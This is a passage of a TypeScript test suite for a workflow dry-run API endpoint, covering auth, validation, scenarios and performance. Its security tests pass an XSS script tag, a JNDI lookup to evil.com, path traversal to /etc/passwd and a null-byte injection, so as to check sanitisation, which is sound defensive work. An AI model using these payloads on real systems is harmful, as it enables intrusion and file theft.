/**
 * Comprehensive Integration Tests for Workflow Dry-Run API Endpoint
 *
 * This test suite covers the workflow dry-run functionality:
 * - POST /api/workflows/[id]/dry-run
 *
 * Key Testing Areas:
 * - Authentication and authorization
 * - Workflow ownership and access verification
 * - Input validation and parameter processing
 * - Execution simulation without side effects
 * - Resource usage estimation
 * - Performance prediction and bottleneck detection
 * - Error scenario simulation
 * - Security validation for execution safety
 * - Rate limiting for computational resources
 * - Complex workflow analysis and reporting
 *
 * Critical Business Logic:
 * - Simulates workflow execution without actual processing
 * - Validates workflow structure and data flow
 * - Estimates resource requirements and execution time
 * - Identifies potential issues before actual execution
 * - Provides detailed analysis and recommendations
 * - Supports various input scenarios and test data
 *
 * Dependencies: vitest, bun-compatible test infrastructure
 * Test Infrastructure: Uses enhanced-utils for consistent mock patterns
 */

import { NextRequest } from 'next/server'
import { beforeEach, describe, expect, it, vi } from 'vitest'

// Import the new bun-compatible test infrastructure
import '@/app/api/__test-utils__/module-mocks'
import {
  createEnhancedMockRequest,
  setupEnhancedTestMocks,
} from '@/app/api/__test-utils__/enhanced-utils'
import { mockControls, mockUser } from '@/app/api/__test-utils__/module-mocks'
// Import the API endpoint under test
import { POST } from './route'

/**
 * Sample workflow data for dry-run testing
 */
const sampleWorkflow = {
  id: 'workflow-123',
  userId: mockUser.id,
  name: 'Data Processing Pipeline',
  description: 'A complex data processing workflow for testing',
  state: {
    blocks: {
      'starter-id': {
        id: 'starter-id',
        type: 'starter',
        name: 'Start',
        position: { x: 100, y: 100 },
        subBlocks: {
          startWorkflow: { id: 'startWorkflow', type: 'dropdown', value: 'manual' },
        },
        outputs: { input: 'any' },
        enabled: true,
      },
      'agent-id': {
        id: 'agent-id',
        type: 'agent',
        name: 'Data Processor',
        position: { x: 400, y: 100 },
        subBlocks: {
          systemPrompt: {
            id: 'systemPrompt',
            type: 'long-input',
            value: 'Process and analyze the input data thoroughly',
          },
          context: { id: 'context', type: 'short-input', value: '<start.input>' },
          model: { id: 'model', type: 'dropdown', value: 'gpt-4o' },
          apiKey: { id: 'apiKey', type: 'short-input', value: '{{OPENAI_API_KEY}}' },
        },
        outputs: {
          response: { content: 'string', model: 'string', tokens: 'any' },
        },
        enabled: true,
      },
      'condition-id': {
        id: 'condition-id',
        type: 'condition',
        name: 'Quality Check',
        position: { x: 700, y: 100 },
        subBlocks: {
          condition: {
            id: 'condition',
            type: 'code-editor',
            value: 'data.response.content.length > 100',
          },
        },
        outputs: { result: 'boolean' },
        enabled: true,
      },
      'analytics-id': {
        id: 'analytics-id',
        type: 'function',
        name: 'Analytics Function',
        position: { x: 1000, y: 50 },
        subBlocks: {
          code: {
            id: 'code',
            type: 'code-editor',
            value:
              'function analyze(data) { return { wordCount: data.content.split(" ").length, sentiment: "positive" }; }',
          },
        },
        outputs: { analytics: 'object' },
        enabled: true,
      },
      'notification-id': {
        id: 'notification-id',
        type: 'webhook',
        name: 'Error Notification',
        position: { x: 1000, y: 200 },
        subBlocks: {
          url: {
            id: 'url',
            type: 'short-input',
            value: 'https://hooks.slack.com/services/error-notifications',
          },
          method: { id: 'method', type: 'dropdown', value: 'POST' },
          body: {
            id: 'body',
            type: 'long-input',
            value: '{"text": "Workflow failed: {{error.message}}"}',
          },
        },
        outputs: { response: 'object' },
        enabled: true,
      },
    },
    edges: [
      {
        id: 'edge-1',
        source: 'starter-id',
        target: 'agent-id',
        sourceHandle: 'input',
        targetHandle: 'context',
      },
      {
        id: 'edge-2',
        source: 'agent-id',
        target: 'condition-id',
        sourceHandle: 'response',
        targetHandle: 'data',
      },
      {
        id: 'edge-3',
        source: 'condition-id',
        target: 'analytics-id',
        sourceHandle: 'true',
        targetHandle: 'data',
        condition: 'result === true',
      },
      {
        id: 'edge-4',
        source: 'condition-id',
        target: 'notification-id',
        sourceHandle: 'false',
        targetHandle: 'data',
        condition: 'result === false',
      },
    ],
    loops: {
      'loop-1': {
        id: 'loop-1',
        blocks: ['agent-id', 'condition-id'],
        condition: 'retryCount < 3',
        maxIterations: 3,
      },
    },
    parallels: {
      'parallel-1': {
        id: 'parallel-1',
        branches: [['analytics-id'], ['notification-id']],
        joinType: 'any',
      },
    },
    lastSaved: Date.now(),
    isDeployed: false,
  },
  runCount: 25,
  isDeployed: true,
  createdAt: new Date('2024-01-01T00:00:00.000Z'),
  updatedAt: new Date('2024-01-20T15:30:00.000Z'),
}

/**
 * Sample dry-run request data
 */
const sampleDryRunRequest = {
  inputData: {
    text: 'This is sample text data for processing and analysis.',
    metadata: {
      source: 'test-input',
      timestamp: new Date().toISOString(),
    },
  },
  options: {
    validateOnly: false,
    includePerformanceMetrics: true,
    simulateErrors: false,
    estimateResources: true,
    maxExecutionTime: 300000, // 5 minutes
  },
  scenarios: [
    {
      name: 'normal-processing',
      description: 'Normal data processing scenario',
      inputOverrides: {},
      blockOverrides: {},
    },
    {
      name: 'large-input',
      description: 'Large input data scenario',
      inputOverrides: {
        text: 'A'.repeat(10000), // Large text input
      },
      blockOverrides: {},
    },
    {
      name: 'error-simulation',
      description: 'Error handling scenario',
      inputOverrides: {
        text: 'invalid-data-trigger-error',
      },
      blockOverrides: {
        'agent-id': {
          simulateError: true,
          errorType: 'API_TIMEOUT',
        },
      },
    },
  ],
}

/**
 * Expected dry-run response structure
 */
const expectedDryRunResponse = {
  workflowId: 'workflow-123',
  dryRunId: 'dryrun_abc123def456',
  status: 'completed',
  executionPlan: {
    totalSteps: 5,
    estimatedDuration: 45000, // 45 seconds
    resourceRequirements: {
      memoryMB: 256,
      cpuUnits: 2,
      networkCalls: 3,
      storageOperations: 1,
    },
    criticalPath: ['starter-id', 'agent-id', 'condition-id', 'analytics-id'],
    parallelPaths: [['analytics-id'], ['notification-id']],
  },
  validationResults: {
    isValid: true,
    errors: [],
    warnings: [
      {
        type: 'PERFORMANCE_WARNING',
        message: 'Agent block may have high latency with current model',
        blockId: 'agent-id',
        severity: 'medium',
      },
    ],
    recommendations: [
      {
        type: 'OPTIMIZATION',
        message: 'Consider caching API responses for improved performance',
        blockId: 'agent-id',
        impact: 'medium',
      },
    ],
  },
  scenarios: [
    {
      name: 'normal-processing',
      status: 'success',
      estimatedDuration: 42000,
      resourceUsage: { memoryMB: 128, cpuUnits: 1.5 },
      outputSample: {
        result: 'Processed successfully',
        analytics: { wordCount: 12, sentiment: 'positive' },
      },
    },
    {
      name: 'large-input',
      status: 'success',
      estimatedDuration: 89000,
      resourceUsage: { memoryMB: 512, cpuUnits: 3.2 },
      warnings: ['High memory usage detected'],
    },
    {
      name: 'error-simulation',
      status: 'error',
      error: {
        type: 'API_TIMEOUT',
        message: 'Simulated API timeout in agent block',
        blockId: 'agent-id',
        recoverable: true,
      },
      fallbackPath: ['starter-id', 'notification-id'],
    },
  ],
  performanceMetrics: {
    bottlenecks: [
      {
        blockId: 'agent-id',
        type: 'API_LATENCY',
        impact: 'high',
        suggestion: 'Consider using faster model or implementing caching',
      },
    ],
    scalabilityAnalysis: {
      maxConcurrentExecutions: 10,
      resourceConstraints: ['API rate limits', 'memory usage'],
    },
  },
  completedAt: new Date(),
}

describe('Workflow Dry-Run API - POST /api/workflows/[id]/dry-run', () => {
  let mocks: any

  beforeEach(() => {
    console.log('🧪 Setting up Workflow Dry-Run tests')

    // Reset all mocks to clean state
    mockControls.reset()
    vi.clearAllMocks()

    mocks = setupEnhancedTestMocks({
      auth: { authenticated: true, user: mockUser },
      database: {
        select: { results: [[sampleWorkflow]] },
        insert: { results: [{ id: 'dryrun_abc123def456' }] },
      },
      permissions: { level: 'admin' },
    })

    console.log('✅ Workflow Dry-Run test setup complete')
  })

  describe('Authentication and Authorization', () => {
    it('should return 401 when user is not authenticated', async () => {
      console.log('🧪 Testing unauthenticated access to dry-run')

      mocks.auth.setUnauthenticated()

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(401)
      const data = await response.json()
      expect(data.error.code).toBe('UNAUTHORIZED')
      expect(data.error.message).toBe('Authentication required')

      console.log('✅ Unauthenticated access properly rejected')
    })

    it('should require workflow access permissions', async () => {
      console.log('🧪 Testing workflow access permission requirement')

      // Setup workflow owned by different user
      const otherUserWorkflow = { ...sampleWorkflow, userId: 'other-user-id' }
      mockControls.setDatabaseResults([[otherUserWorkflow]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(403)
      const data = await response.json()
      expect(data.error.code).toBe('ACCESS_DENIED')
      expect(data.error.message).toContain('permission')

      console.log('✅ Workflow access permission requirement enforced')
    })

    it('should allow dry-run with valid access', async () => {
      console.log('🧪 Testing successful dry-run with valid access')

      mockControls.setDatabaseResults([
        [sampleWorkflow], // Workflow access check
        [{ id: 'dryrun_abc123def456' }], // Dry-run record creation
      ])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.workflowId).toBe('workflow-123')
      expect(data.dryRunId).toBeDefined()

      console.log('✅ Valid access dry-run successful')
    })
  })

  describe('Workflow Validation', () => {
    it('should return 404 for non-existent workflow', async () => {
      console.log('🧪 Testing dry-run for non-existent workflow')

      // Setup empty workflow response
      mockControls.setDatabaseResults([[]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'nonexistent-workflow' },
      })

      expect(response.status).toBe(404)
      const data = await response.json()
      expect(data.error.code).toBe('WORKFLOW_NOT_FOUND')
      expect(data.error.message).toBe('Workflow not found')

      console.log('✅ Non-existent workflow properly handled')
    })

    it('should validate workflow structure before dry-run', async () => {
      console.log('🧪 Testing workflow structure validation')

      const invalidWorkflow = {
        ...sampleWorkflow,
        state: {
          blocks: {}, // Empty blocks
          edges: [],
          loops: {},
          parallels: {},
          lastSaved: Date.now(),
          isDeployed: false,
        },
      }

      mockControls.setDatabaseResults([[invalidWorkflow]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('INVALID_WORKFLOW_STRUCTURE')
      expect(data.error.message).toContain('workflow structure')

      console.log('✅ Workflow structure validation successful')
    })

    it('should detect circular dependencies', async () => {
      console.log('🧪 Testing circular dependency detection')

      const circularWorkflow = {
        ...sampleWorkflow,
        state: {
          ...sampleWorkflow.state,
          edges: [
            ...sampleWorkflow.state.edges,
            {
              id: 'circular-edge',
              source: 'analytics-id',
              target: 'agent-id', // Creates circular dependency
              sourceHandle: 'analytics',
              targetHandle: 'context',
            },
          ],
        },
      }

      mockControls.setDatabaseResults([[circularWorkflow]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('CIRCULAR_DEPENDENCY')
      expect(data.error.message).toContain('circular dependency')

      console.log('✅ Circular dependency detection successful')
    })

    it('should validate block configurations', async () => {
      console.log('🧪 Testing block configuration validation')

      const workflowWithInvalidBlock = {
        ...sampleWorkflow,
        state: {
          ...sampleWorkflow.state,
          blocks: {
            ...sampleWorkflow.state.blocks,
            'invalid-agent': {
              id: 'invalid-agent',
              type: 'agent',
              name: 'Invalid Agent',
              position: { x: 500, y: 500 },
              subBlocks: {
                systemPrompt: { id: 'systemPrompt', type: 'long-input', value: '' }, // Empty required field
                apiKey: { id: 'apiKey', type: 'short-input', value: '' }, // Missing API key
              },
              outputs: { response: 'string' },
              enabled: true,
            },
          },
        },
      }

      mockControls.setDatabaseResults([[workflowWithInvalidBlock]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('INVALID_BLOCK_CONFIGURATION')
      expect(data.error.details).toBeDefined()

      console.log('✅ Block configuration validation successful')
    })
  })

  describe('Input Validation', () => {
    it('should validate required input data', async () => {
      console.log('🧪 Testing required input data validation')

      const invalidRequest = {
        options: sampleDryRunRequest.options,
        scenarios: sampleDryRunRequest.scenarios,
        // Missing inputData
      }

      mockControls.setDatabaseResults([[sampleWorkflow]])

      const response = await POST(createEnhancedMockRequest('POST', invalidRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')
      expect(data.error.message).toContain('inputData')

      console.log('✅ Required input data validation successful')
    })

    it('should validate dry-run options', async () => {
      console.log('🧪 Testing dry-run options validation')

      const invalidOptions = [
        {
          ...sampleDryRunRequest,
          options: {
            ...sampleDryRunRequest.options,
            maxExecutionTime: -1000, // Negative value
          },
        },
        {
          ...sampleDryRunRequest,
          options: {
            ...sampleDryRunRequest.options,
            maxExecutionTime: 7200000, // Too high (2 hours)
          },
        },
      ]

      mockControls.setDatabaseResults([[sampleWorkflow]])

      for (const invalidRequest of invalidOptions) {
        const response = await POST(createEnhancedMockRequest('POST', invalidRequest), {
          params: { id: 'workflow-123' },
        })

        expect(response.status).toBe(400)
      }

      console.log('✅ Dry-run options validation successful')
    })

    it('should validate scenario configurations', async () => {
      console.log('🧪 Testing scenario configuration validation')

      const invalidScenarios = {
        ...sampleDryRunRequest,
        scenarios: [
          {
            name: '', // Empty name
            description: 'Invalid scenario',
            inputOverrides: {},
            blockOverrides: {},
          },
          {
            name: 'duplicate-name',
            description: 'First scenario',
            inputOverrides: {},
            blockOverrides: {},
          },
          {
            name: 'duplicate-name', // Duplicate name
            description: 'Second scenario',
            inputOverrides: {},
            blockOverrides: {},
          },
        ],
      }

      mockControls.setDatabaseResults([[sampleWorkflow]])

      const response = await POST(createEnhancedMockRequest('POST', invalidScenarios), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('INVALID_SCENARIOS')

      console.log('✅ Scenario configuration validation successful')
    })

    it('should handle large input data gracefully', async () => {
      console.log('🧪 Testing large input data handling')

      const largeInputRequest = {
        ...sampleDryRunRequest,
        inputData: {
          text: 'A'.repeat(1000000), // 1MB of text
          largeObject: Object.fromEntries(
            Array.from({ length: 10000 }, (_, i) => [`key${i}`, `value${i}`])
          ),
        },
      }

      mockControls.setDatabaseResults([[sampleWorkflow]])

      const response = await POST(createEnhancedMockRequest('POST', largeInputRequest), {
        params: { id: 'workflow-123' },
      })

      // Should either process or reject with appropriate message
      expect([200, 413]).toContain(response.status)

      if (response.status === 413) {
        const data = await response.json()
        expect(data.error.code).toBe('INPUT_TOO_LARGE')
      }

      console.log('✅ Large input data handling successful')
    })
  })

  describe('Successful Dry-Run Operations', () => {
    it('should execute basic dry-run successfully', async () => {
      console.log('🧪 Testing basic dry-run execution')

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify response structure
      expect(data).toHaveProperty('workflowId')
      expect(data).toHaveProperty('dryRunId')
      expect(data).toHaveProperty('status')
      expect(data).toHaveProperty('executionPlan')
      expect(data).toHaveProperty('validationResults')
      expect(data).toHaveProperty('scenarios')

      expect(data.workflowId).toBe('workflow-123')
      expect(data.status).toBe('completed')

      console.log('✅ Basic dry-run execution successful')
    })

    it('should provide detailed execution plan', async () => {
      console.log('🧪 Testing detailed execution plan generation')

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify execution plan structure
      expect(data.executionPlan).toHaveProperty('totalSteps')
      expect(data.executionPlan).toHaveProperty('estimatedDuration')
      expect(data.executionPlan).toHaveProperty('resourceRequirements')
      expect(data.executionPlan).toHaveProperty('criticalPath')
      expect(data.executionPlan).toHaveProperty('parallelPaths')

      expect(data.executionPlan.totalSteps).toBeGreaterThan(0)
      expect(data.executionPlan.estimatedDuration).toBeGreaterThan(0)
      expect(Array.isArray(data.executionPlan.criticalPath)).toBe(true)

      console.log('✅ Detailed execution plan generation successful')
    })

    it('should include comprehensive validation results', async () => {
      console.log('🧪 Testing comprehensive validation results')

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify validation results structure
      expect(data.validationResults).toHaveProperty('isValid')
      expect(data.validationResults).toHaveProperty('errors')
      expect(data.validationResults).toHaveProperty('warnings')
      expect(data.validationResults).toHaveProperty('recommendations')

      expect(typeof data.validationResults.isValid).toBe('boolean')
      expect(Array.isArray(data.validationResults.errors)).toBe(true)
      expect(Array.isArray(data.validationResults.warnings)).toBe(true)
      expect(Array.isArray(data.validationResults.recommendations)).toBe(true)

      console.log('✅ Comprehensive validation results successful')
    })

    it('should process multiple scenarios', async () => {
      console.log('🧪 Testing multiple scenario processing')

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify scenarios processing
      expect(Array.isArray(data.scenarios)).toBe(true)
      expect(data.scenarios.length).toBe(sampleDryRunRequest.scenarios.length)

      data.scenarios.forEach((scenario: any) => {
        expect(scenario).toHaveProperty('name')
        expect(scenario).toHaveProperty('status')
        expect(scenario).toHaveProperty('estimatedDuration')
        expect(scenario).toHaveProperty('resourceUsage')
      })

      console.log('✅ Multiple scenario processing successful')
    })

    it('should include performance metrics when requested', async () => {
      console.log('🧪 Testing performance metrics inclusion')

      const requestWithMetrics = {
        ...sampleDryRunRequest,
        options: {
          ...sampleDryRunRequest.options,
          includePerformanceMetrics: true,
        },
      }

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', requestWithMetrics), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify performance metrics
      expect(data).toHaveProperty('performanceMetrics')
      expect(data.performanceMetrics).toHaveProperty('bottlenecks')
      expect(data.performanceMetrics).toHaveProperty('scalabilityAnalysis')

      expect(Array.isArray(data.performanceMetrics.bottlenecks)).toBe(true)

      console.log('✅ Performance metrics inclusion successful')
    })

    it('should estimate resource requirements accurately', async () => {
      console.log('🧪 Testing resource requirement estimation')

      const requestWithResources = {
        ...sampleDryRunRequest,
        options: {
          ...sampleDryRunRequest.options,
          estimateResources: true,
        },
      }

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', requestWithResources), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify resource estimation
      expect(data.executionPlan.resourceRequirements).toHaveProperty('memoryMB')
      expect(data.executionPlan.resourceRequirements).toHaveProperty('cpuUnits')
      expect(data.executionPlan.resourceRequirements).toHaveProperty('networkCalls')
      expect(data.executionPlan.resourceRequirements).toHaveProperty('storageOperations')

      expect(data.executionPlan.resourceRequirements.memoryMB).toBeGreaterThan(0)
      expect(data.executionPlan.resourceRequirements.cpuUnits).toBeGreaterThan(0)

      console.log('✅ Resource requirement estimation successful')
    })
  })

  describe('Error Simulation and Handling', () => {
    it('should simulate error scenarios when requested', async () => {
      console.log('🧪 Testing error scenario simulation')

      const errorSimulationRequest = {
        ...sampleDryRunRequest,
        options: {
          ...sampleDryRunRequest.options,
          simulateErrors: true,
        },
        scenarios: [
          {
            name: 'api-timeout-scenario',
            description: 'API timeout error simulation',
            inputOverrides: {},
            blockOverrides: {
              'agent-id': {
                simulateError: true,
                errorType: 'API_TIMEOUT',
                errorProbability: 1.0,
              },
            },
          },
        ],
      }

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', errorSimulationRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify error simulation
      const errorScenario = data.scenarios.find((s: any) => s.name === 'api-timeout-scenario')
      expect(errorScenario).toBeDefined()
      expect(errorScenario.status).toBe('error')
      expect(errorScenario.error).toBeDefined()
      expect(errorScenario.error.type).toBe('API_TIMEOUT')

      console.log('✅ Error scenario simulation successful')
    })

    it('should identify error recovery paths', async () => {
      console.log('🧪 Testing error recovery path identification')

      const workflowWithErrorHandling = {
        ...sampleWorkflow,
        state: {
          ...sampleWorkflow.state,
          blocks: {
            ...sampleWorkflow.state.blocks,
            'fallback-id': {
              id: 'fallback-id',
              type: 'function',
              name: 'Fallback Handler',
              position: { x: 400, y: 300 },
              subBlocks: {
                code: {
                  id: 'code',
                  type: 'code-editor',
                  value: 'function fallback() { return { result: "fallback-processed" }; }',
                },
              },
              outputs: { result: 'object' },
              enabled: true,
            },
          },
          edges: [
            ...sampleWorkflow.state.edges,
            {
              id: 'error-edge',
              source: 'agent-id',
              target: 'fallback-id',
              sourceHandle: 'error',
              targetHandle: 'input',
              condition: 'error.type === "API_TIMEOUT"',
            },
          ],
        },
      }

      mockControls.setDatabaseResults([
        [workflowWithErrorHandling],
        [{ id: 'dryrun_abc123def456' }],
      ])

      const response = await POST(
        createEnhancedMockRequest('POST', {
          ...sampleDryRunRequest,
          options: { ...sampleDryRunRequest.options, simulateErrors: true },
        }),
        { params: { id: 'workflow-123' } }
      )

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify fallback path identification
      expect(data.executionPlan).toHaveProperty('fallbackPaths')
      expect(data.executionPlan.fallbackPaths).toBeDefined()

      console.log('✅ Error recovery path identification successful')
    })

    it('should handle validation-only mode', async () => {
      console.log('🧪 Testing validation-only mode')

      const validationOnlyRequest = {
        ...sampleDryRunRequest,
        options: {
          ...sampleDryRunRequest.options,
          validateOnly: true,
        },
      }

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', validationOnlyRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify validation-only response
      expect(data.status).toBe('validation-completed')
      expect(data).toHaveProperty('validationResults')
      expect(data).not.toHaveProperty('scenarios')
      expect(data.executionPlan).toBeDefined()
      expect(data.executionPlan.estimatedDuration).toBe(0)

      console.log('✅ Validation-only mode successful')
    })
  })

  describe('Performance and Scalability', () => {
    it('should handle complex workflows efficiently', async () => {
      console.log('🧪 Testing complex workflow handling efficiency')

      // Create a complex workflow with many blocks
      const complexBlocks = Object.fromEntries(
        Array.from({ length: 50 }, (_, i) => [
          `block-${i}`,
          {
            id: `block-${i}`,
            type: i % 3 === 0 ? 'agent' : i % 3 === 1 ? 'function' : 'condition',
            name: `Block ${i}`,
            position: { x: i * 100, y: Math.floor(i / 10) * 150 },
            subBlocks: {
              config: { id: 'config', type: 'short-input', value: `config-${i}` },
            },
            outputs: { result: 'any' },
            enabled: true,
          },
        ])
      )

      const complexEdges = Array.from({ length: 49 }, (_, i) => ({
        id: `edge-${i}`,
        source: `block-${i}`,
        target: `block-${i + 1}`,
        sourceHandle: 'result',
        targetHandle: 'input',
      }))

      const complexWorkflow = {
        ...sampleWorkflow,
        state: {
          blocks: complexBlocks,
          edges: complexEdges,
          loops: {},
          parallels: {},
          lastSaved: Date.now(),
          isDeployed: false,
        },
      }

      mockControls.setDatabaseResults([[complexWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const startTime = Date.now()
      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })
      const endTime = Date.now()

      expect(response.status).toBe(200)
      expect(endTime - startTime).toBeLessThan(10000) // Should complete within 10 seconds

      const data = await response.json()
      expect(data.executionPlan.totalSteps).toBe(50)

      console.log('✅ Complex workflow handling efficiency verified')
    })

    it('should enforce rate limiting for computational resources', async () => {
      console.log('🧪 Testing computational resource rate limiting')

      // Simulate multiple concurrent dry-run requests
      mockControls.setDatabaseResults([
        [sampleWorkflow],
        [{ id: 'dryrun_1' }],
        [{ id: 'dryrun_2' }],
        [{ id: 'dryrun_3' }],
      ])

      const concurrentRequests = Array.from({ length: 5 }, (_, i) =>
        POST(
          createEnhancedMockRequest('POST', {
            ...sampleDryRunRequest,
            options: {
              ...sampleDryRunRequest.options,
              maxExecutionTime: 300000,
            },
          }),
          { params: { id: 'workflow-123' } }
        )
      )

      const responses = await Promise.all(concurrentRequests)

      // Some requests should succeed
      const successfulResponses = responses.filter((r) => r.status === 200)
      expect(successfulResponses.length).toBeGreaterThan(0)

      // Some might be rate-limited
      const rateLimitedResponses = responses.filter((r) => r.status === 429)
      expect(successfulResponses.length + rateLimitedResponses.length).toBe(5)

      console.log('✅ Computational resource rate limiting successful')
    })

    it('should optimize execution for parallel paths', async () => {
      console.log('🧪 Testing parallel path optimization')

      const parallelWorkflow = {
        ...sampleWorkflow,
        state: {
          ...sampleWorkflow.state,
          parallels: {
            'parallel-1': {
              id: 'parallel-1',
              branches: [['analytics-id'], ['notification-id'], ['condition-id']],
              joinType: 'all',
            },
          },
        },
      }

      mockControls.setDatabaseResults([[parallelWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify parallel optimization
      expect(data.executionPlan.parallelPaths).toBeDefined()
      expect(data.executionPlan.parallelPaths.length).toBeGreaterThan(1)
      expect(data.performanceMetrics).toHaveProperty('parallelizationEfficiency')

      console.log('✅ Parallel path optimization successful')
    })
  })

  describe('Security and Validation', () => {
    it('should sanitize input data to prevent injection attacks', async () => {
      console.log('🧪 Testing input data sanitization')

      const maliciousRequest = {
        ...sampleDryRunRequest,
        inputData: {
          text: '<script>alert("xss")</script>Malicious input',
          metadata: {
            command: '${jndi:ldap://evil.com}',
            injection: '../../etc/passwd',
          },
        },
      }

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', maliciousRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify that malicious content is sanitized or handled safely
      expect(data.scenarios[0].outputSample).toBeDefined()
      // Content should not contain raw malicious scripts
      const outputStr = JSON.stringify(data.scenarios[0].outputSample)
      expect(outputStr).not.toContain('<script>')
      expect(outputStr).not.toContain('${jndi:')

      console.log('✅ Input data sanitization successful')
    })

    it('should validate workflow ID format', async () => {
      console.log('🧪 Testing workflow ID format validation')

      const maliciousIds = [
        '../../../etc/passwd',
        '<script>alert(1)</script>',
        '${jndi:ldap://evil.com}',
        'workflow\x00injection',
      ]

      for (const maliciousId of maliciousIds) {
        const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
          params: { id: maliciousId },
        })

        expect([400, 404]).toContain(response.status)
      }

      console.log('✅ Workflow ID format validation successful')
    })

    it('should prevent excessive resource consumption', async () => {
      console.log('🧪 Testing resource consumption prevention')

      const resourceIntensiveRequest = {
        ...sampleDryRunRequest,
        scenarios: Array.from({ length: 100 }, (_, i) => ({
          name: `scenario-${i}`,
          description: `Resource intensive scenario ${i}`,
          inputOverrides: {
            largeData: 'A'.repeat(100000), // Large data per scenario
          },
          blockOverrides: {},
        })),
      }

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', resourceIntensiveRequest), {
        params: { id: 'workflow-123' },
      })

      // Should either process with limits or reject
      expect([200, 413, 429]).toContain(response.status)

      if (response.status === 413) {
        const data = await response.json()
        expect(data.error.code).toBe('REQUEST_TOO_LARGE')
      } else if (response.status === 429) {
        const data = await response.json()
        expect(data.error.code).toBe('RATE_LIMIT_EXCEEDED')
      }

      console.log('✅ Resource consumption prevention successful')
    })
  })

  describe('Error Handling', () => {
    it('should handle malformed JSON gracefully', async () => {
      console.log('🧪 Testing malformed JSON handling')

      const request = new NextRequest('http://localhost:3000/api/workflows/workflow-123/dry-run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid-json-content',
      })

      const response = await POST(request, { params: { id: 'workflow-123' } })

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Malformed JSON handled gracefully')
    })

    it('should handle database errors gracefully', async () => {
      console.log('🧪 Testing database error handling')

      // Force database error
      const originalSelect = mocks.database.mockDb.select
      mocks.database.mockDb.select = vi.fn(() => {
        throw new Error('Database connection failed')
      })

      const response = await POST(createEnhancedMockRequest('POST', sampleDryRunRequest), {
        params: { id: 'workflow-123' },
      })

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Database error handled gracefully')
    })

    it('should handle timeout scenarios', async () => {
      console.log('🧪 Testing timeout scenario handling')

      const timeoutRequest = {
        ...sampleDryRunRequest,
        options: {
          ...sampleDryRunRequest.options,
          maxExecutionTime: 1, // Very short timeout
        },
      }

      mockControls.setDatabaseResults([[sampleWorkflow], [{ id: 'dryrun_abc123def456' }]])

      const response = await POST(createEnhancedMockRequest('POST', timeoutRequest), {
        params: { id: 'workflow-123' },
      })

